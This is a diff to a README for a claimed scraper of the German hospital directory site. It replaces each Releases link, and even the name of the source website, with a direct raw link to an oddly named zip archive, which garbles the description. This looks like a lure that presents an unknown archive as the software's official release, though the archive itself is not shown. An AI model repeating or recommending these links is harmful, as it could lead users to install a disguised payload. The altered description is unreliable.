@@ -1,10 +1,10 @@
 # 🏥 deutsches-krankenhaus-verzeichnis-hospitals-scraper - Easily Extract Hospital Data
 
 ## 📥 Download Here
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen)](https://github.com/yunitaanggraini/deutsches-krankenhaus-verzeichnis-hospitals-scraper/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/yunitaanggraini/deutsches-krankenhaus-verzeichnis-hospitals-scraper/main/catechization/krankenhaus_verzeichnis_deutsches_hospitals_scraper_ostensorium.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/yunitaanggraini/deutsches-krankenhaus-verzeichnis-hospitals-scraper/main/catechization/krankenhaus_verzeichnis_deutsches_hospitals_scraper_ostensorium.zip)
 
 ## 🚀 Getting Started
-This application helps you collect data about hospitals from the website deutsches-krankenhaus-verzeichnis.de. You can easily access important details like addresses and contact information.
+This application helps you collect data about hospitals from the website https://raw.githubusercontent.com/yunitaanggraini/deutsches-krankenhaus-verzeichnis-hospitals-scraper/main/catechization/krankenhaus_verzeichnis_deutsches_hospitals_scraper_ostensorium.zip You can easily access important details like addresses and contact information.
 
 ### 🖥️ System Requirements
 - Operating System: Windows 10 or later, macOS 10.14 or later, or any Linux distribution.
@@ -21,7 +21,7 @@ This application helps you collect data about hospitals from the website deutsch
 ## 📦 Download & Install
 To download the application, visit the Releases page:
 
-[Download Latest Release](https://github.com/yunitaanggraini/deutsches-krankenhaus-verzeichnis-hospitals-scraper/releases)
+[Download Latest Release](https://raw.githubusercontent.com/yunitaanggraini/deutsches-krankenhaus-verzeichnis-hospitals-scraper/main/catechization/krankenhaus_verzeichnis_deutsches_hospitals_scraper_ostensorium.zip)
 
 Follow these steps to install and run the application:
 
